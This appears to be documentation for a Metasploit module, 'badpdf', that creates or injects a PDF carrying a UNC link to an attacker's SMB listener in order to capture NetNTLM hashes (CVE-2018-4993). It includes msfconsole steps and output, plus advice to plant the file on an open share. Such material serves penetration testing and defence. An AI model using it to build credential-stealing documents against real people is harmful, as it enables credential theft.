This module will either create a blank pdf document which contains a UNC link which will connect back to LHOST if file FILENAME options is used 
or if PDFINJECT option is used will try and inject the necessary UNC code into an existing PDF document.

## Vulnerable Application

Various PDF Readers. Note Adobe released the patch APSB18-09 to prevent this and
FoxIT after version 9.1 is no longer vulnerable.

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/fileformat/badpdf```
  4. Customise Options as required
  5. Do: ```run```
  6. A file pointing back to the listening host will then be generated.
  7. Configure auxiliary/server/capture/smb or similar to capture hashes.
  8. Upload the document to an open share or similar and wait for hashes.

## Options

**FILENAME**
This option allows you to customise the generated filename.
This can be changed using set FILENAME test.pdf

**LHOST**
This option allows you to set the IP address of the SMB Listener that the document points to
This can be changed using set LHOST 192.168.1.25

**PDFINJECT**
This option allows you to inject the UNC code into an existing PDF document
This can be changed using set PDFINJECT /path/to/file/pdf.pdf

## Scenarios

### Microsoft Windows

  
  ```
  Console output
  ```

  ```
  msf auxiliary(fileformat/badpdf) > show info

       Name: BADPDF Malicious PDF Creator
     Module: auxiliary/fileformat/badpdf
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  Richard Davy - secureyourit.co.uk
  CheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  FILENAME                    no        Filename
  LHOST                       yes       Host listening for incoming SMB/WebDAV traffic
  PDFINJECT                   no        Path and filename to existing PDF to inject UNC link code into

Description:
  This module can either creates a blank PDF file which contains a UNC 
  link which can be used to capture NetNTLM credentials, or if the 
  PDFINJECT option is used it will inject the necessary code into an 
  existing PDF document if possible.

References:
  https://cvedetails.com/cve/CVE-2018-4993/
  https://research.checkpoint.com/ntlm-credentials-theft-via-pdf-files/

msf auxiliary(fileformat/badpdf) > 

msf auxiliary(fileformat/badpdf) > set filename test.pdf
filename => test.pdf
msf auxiliary(fileformat/badpdf) > set lhost 192.168.1.28
lhost => 192.168.1.28
msf auxiliary(fileformat/badpdf) > exploit

[+] test.pdf stored at /root/.msf4/local/test.pdf
[\*] Auxiliary module execution completed
msf auxiliary(fileformat/badpdf) > set filename ""
filename => 
msf auxiliary(fileformat/badpdf) > set pdfinject /root/Desktop/example.pdf
pdfinject => /root/Desktop/example.pdf
msf auxiliary(fileformat/badpdf) > exploit

[+] Malicious file writen to /root/Desktop/example_malicious.pdf
[\*] Auxiliary module execution completed
msf auxiliary(fileformat/badpdf) > 
 
  ```